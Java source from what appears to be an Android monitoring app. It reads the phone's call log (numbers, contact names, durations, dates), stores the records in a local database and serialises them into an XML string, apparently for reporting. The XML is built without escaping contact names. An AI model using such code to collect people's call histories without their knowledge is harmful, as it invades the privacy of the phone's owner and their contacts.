package com.isoc.android.monitor;

import android.content.ContentValues;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.provider.CallLog;

/**

 */

public class ContactsCapture {

    protected static void getCallLog(Context context) {
        String[] projection=new String[]{CallLog.Calls.NUMBER,CallLog.Calls.TYPE,CallLog.Calls.DURATION,CallLog.Calls.DATE,CallLog.Calls.CACHED_NAME};
        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, projection, null, null, CallLog.Calls.DATE+ " DESC");
        if (cursor==null) return;
        int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
        int name = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);

        SQLiteDatabase db=new Database(context).getWritableDatabase();

        while (cursor.moveToNext()) {
            ContentValues values = new ContentValues();
            values.put(Database.DatabaseSchema.CallLog.COLUMN_NAME_NUMBER,cursor.getString(number));
            values.put(Database.DatabaseSchema.CallLog.COLUMN_NAME_DURATION,cursor.getString(duration));
            values.put(Database.DatabaseSchema.CallLog.COLUMN_NAME_DATE,cursor.getString(date));
            String contactName=cursor.getString(name);
            String n=(contactName==null) ? "Unknown" : contactName;
            values.put(Database.DatabaseSchema.CallLog.COLUMN_NAME_NAME,n);

            String callType;
            switch (Integer.parseInt(cursor.getString(type))) {
                case CallLog.Calls.OUTGOING_TYPE:
                    callType = "Outgoing";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    callType = "Incoming";
                    break;
                case CallLog.Calls.MISSED_TYPE:
                    callType = "Missed";
                    break;
                default:
                    callType = "Unknown";
                    break;
            }
            values.put(Database.DatabaseSchema.CallLog.COLUMN_NAME_TYPE,callType);
            db.insertWithOnConflict(Database.DatabaseSchema.CallLog.TABLE_NAME,null,values,SQLiteDatabase.CONFLICT_IGNORE);
        }
        cursor.close();
        db.close();
    }

    protected static String getCallXML(Context context, SharedPreferences prefs) {
        SQLiteDatabase db=new Database(context).getReadableDatabase();
        Cursor cursor = db.query(Database.DatabaseSchema.CallLog.TABLE_NAME,null,null,null,null,null,null);
        StringBuilder result=new StringBuilder();
        int date= cursor.getColumnIndex(Database.DatabaseSchema.CallLog.COLUMN_NAME_DATE);
        int type=cursor.getColumnIndex(Database.DatabaseSchema.CallLog.COLUMN_NAME_TYPE);
        int duration=cursor.getColumnIndex(Database.DatabaseSchema.CallLog.COLUMN_NAME_DURATION);
        int name =cursor.getColumnIndex(Database.DatabaseSchema.CallLog.COLUMN_NAME_NAME);
        int number=cursor.getColumnIndex(Database.DatabaseSchema.CallLog.COLUMN_NAME_NUMBER);

        while (cursor.moveToNext()) {
                result.append("<call time=\"" + TimeCapture.getTime(cursor.getLong(date)) +"\" type=\"" + cursor.getString(type) +
                        "\" duration=\"" + cursor.getString(duration) + "\" name=\"" + cursor.getString(name) + "\">" +
                        cursor.getString(number) + "</call>\n");
        }
        db.close();
        cursor.close();
        return result.toString();
    }
}
